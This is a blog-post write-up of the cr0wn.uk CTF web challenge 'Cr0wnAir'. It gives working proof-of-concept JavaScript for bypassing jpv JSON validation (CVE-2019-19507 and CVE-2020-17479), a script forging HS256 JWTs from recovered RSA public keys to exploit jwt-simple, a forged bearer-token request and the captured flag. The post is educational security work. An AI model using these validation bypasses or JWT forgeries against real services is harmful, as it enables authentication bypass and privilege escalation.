+++
title = "cr0wn.uk CTF - web/Cr0wnAir"
lastmod = 2021-02-23T12:01:53+08:00
tags = ["ctf"]
categories = ["blog"]
draft = false
weight = 2004
+++

## Taking couple days off on a weekend getaway {#taking-couple-days-off-on-a-weekend-getaway}

I've been focusing solely on OSCP materials last couple weeks that I wanted a day away.  I saw a Twitter post about a CTF hosted by cr0wn.  I've played couple CTFs and enjoyed working through the problems so I decided I'll spend some time on it.  Thankfully the problem I chose was really enjoyable and I've learned some new things going through it.  More importantly, there is a subject that I am inspired to dig into as well.


## web/Cr0wnAir {#web-cr0wnair}

Challege was to checkin to the flight on Cr0wn Air and upgrade to receive some perks - including the flag.
First thing I noticed was that checkin form was being validated on the server.  It used `jpv` library ([Json Pattern Validator](https://github.com/manvel-khnkoyan/jpv)) and with a quick search noticed that older version was vulnerable to validation bypass.
Similarly, `jwt-simple` library, used for creating and validating JWT tokens is vulnerable to signature verification bypass gave further clues for formulating my attack plan.
In between the requests to the server, we'll need to re-sign our token with upgraded status.
Final sequence of exploits I've used to tackle this challenge:

{{< figure src="/ox-hugo/plan.png" >}}


### jpv - validation bypass {#jpv-validation-bypass}

Quick check inside `package-lock.json` shows apps is using vulnerable version (2.0.1)

-   <https://nvd.nist.gov/vuln/detail/CVE-2019-19507>
-   <https://nvd.nist.gov/vuln/detail/CVE-2020-17479>

There are two CVEs, both of which, bypasses array check and were both applicable to version being used.  Both PoC did work but since we are passing in JSON (we cannot send javascript functions in a request), exploiting CVE-2019-19507 was a better option.

```js
const jpv = require("jpv");

const pattern = {
    firstName: /^\w{1,30}$/,
    lastName: /^\w{1,30}$/,
    passport: /^[0-9]{9}$/,
    ffp: /^(|CA[0-9]{8})$/,
    extras: [
        { sssr: /^(BULK|UMNR|VGML)$/ },
    ],
};

var valid = {
    firstName: "Ellie",
    lastName: "Pahn",
    passport: "123456789",
    ffp: "CA12345678",
    extras: [
        { sssr: "BULK" },
        { sssr: "VGML" },
    ],
}

// CVE-2020-17479
var spoof_array_2020 = {
    firstName: "Ellie",
    lastName: "Pahn",
    passport: "123456789",
    ffp: "CA12345678",
    extras: {
        constructor: [].constructor,
        0: { "sssr": "BULK" }
    }
}

var spoof_array_and_bypass_regex_2020 = {
    firstName: "Ellie",
    lastName: "Pahn",
    passport: "123456789",
    ffp: "CA12345678",
    extras: {
        constructor: [].constructor,
        0: { "sssr": "BULK" },
        1: { "sssr": "FQTU" }
    }
}

// CVE-2019-19507
var spoof_array_2019 = {
    firstName: "Ellie",
    lastName: "Pahn",
    passport: "123456789",
    ffp: "CA12345678",
    extras: {
        constructor: { name: "Array" },
        0: { "sssr": "BULK" }
    }
}

var spoof_array_and_bypass_regex_2019 = {
    firstName: "Ellie",
    lastName: "Pahn",
    passport: "123456789",
    ffp: "CA12345678",
    extras: {
        constructor: { name: "Array" },
        0: { "sssr": "BULK" },
        1: { "sssr": "FQTU" }
    }
}

console.log("Valid Data: " + jpv.validate(valid, pattern));
console.log("CVE-2020-17479 (array): " + jpv.validate(spoof_array_2020, pattern));
console.log("CVE-2020-17479 (array + regex): " + jpv.validate(spoof_array_and_bypass_regex_2020, pattern));
console.log("CVE-2019-19507 (array): " + jpv.validate(spoof_array_2019, pattern));
console.log("CVE-2019-19507 (array + regex): " + jpv.validate(spoof_array_and_bypass_regex_2019, pattern));
```


### recovering rsa public key for re-signing JWT {#recovering-rsa-public-key-for-re-signing-jwt}

-   <https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/>

> "although public key cryptosystems guarantee that the private key can't be derived from the public key, signatures, ciphertexts, etc., there are usually no such guarantees for the public key!"

I'll be going through the details of this exploit in a future post (was inspired to dig in deeper).  In short, I was able to use `jwt_forgery.py` from [Silent Signal's PoC](https://github.com/silentsignal/rsa%5Fsign2n) to recover RSA public needed to sign the updated JWT payload.

```js
const fs = require("fs");
const jwt = require("jwt-simple");


function from_file_forge(payload, file){
    fs.readFile(file, 'utf8', function(err, data) {
        if (err) {
            return console.log(err);
        }
        var f = jwt.encode(payload, data, 'HS256');
        console.log(f)
    });
}

var payload = {
    status: "gold",
    ffp: "CA12345678"
}

from_file_forge(payload, '3d1fedcff75c3fc7_65537_pkcs1.pem');
from_file_forge(payload, '3d1fedcff75c3fc7_65537_x509.pem');
from_file_forge(payload, 'c3995f664ac0cc18_65537_pkcs1.pem');
from_file_forge(payload, 'c3995f664ac0cc18_65537_x509.pem');
```


### jwt-simple - signature verfication bypass {#jwt-simple-signature-verfication-bypass}

-   <https://snyk.io/test/npm/jwt-simple/0.5.2>

By looking at the source (routes/upgrades.js), we can verify that we are able to exploit the vulnerability

<a id="code-snippet--routes-upgrades.js"></a>
{{< highlight js "linenos=table, linenostart=9" >}}
function getLoyaltyStatus(req, res, next) {
  if (req.headers.authorization) {
    let token = req.headers.authorization.split(" ")[1];
    try {
      var decoded = jwt.decode(token, config.pubkey);
    } catch {
      return res.json({ msg: 'Token is not valid.' });
    }
    res.locals.token = decoded;
  }
  next()
}
{{< /highlight >}}

so we can simply pass in the token into the request:

```restclient
POST http://34.105.202.19:3000/upgrades/flag
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJnb2xkIiwiZmZwIjoiQ0ExMjM0NTY3OCJ9.vmnozFL35fVZ4cuftUCbhmAx6X601KbVC4yqGnbzaRc
```

We are then gifted with the flag:

```json
{
  "msg": "union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}"
}
```
